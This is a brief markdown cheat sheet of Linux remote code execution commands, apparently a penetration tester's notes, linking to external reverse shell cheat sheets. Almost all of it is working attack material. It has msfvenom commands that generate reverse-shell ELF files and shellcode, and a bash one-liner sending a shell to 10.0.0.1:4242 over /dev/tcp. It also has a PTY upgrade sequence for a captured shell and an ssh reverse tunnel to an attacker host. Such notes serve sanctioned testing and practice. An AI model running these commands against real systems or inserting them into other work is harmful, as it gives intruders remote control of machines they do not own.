# Linux Remote Code Execution

## <a href='https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/' target="blank">MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter)</a>

## <a href='https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md' target="blank">Reverse Shell Cheat Sheet</a>

### Check list

``` bash
msfvenom  --list encoders
```

### File

``` bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

### Shell Code

``` bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -v shellcode -f py
```

## Reverse Shell using bash

``` bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```

## Upgrade shell

``` bash
/usr/bin/python -c "import pty; pty.spawn('/bin/sh')"
export TERM=xterm

stty raw -echo
fg
```

## <a href='https://www.ssh.com/ssh/tunneling/example' target="blank">Port Tunneling</a>

``` bash
ssh -R $myip:8080:127.0.0.1:8080 kali@$myip
```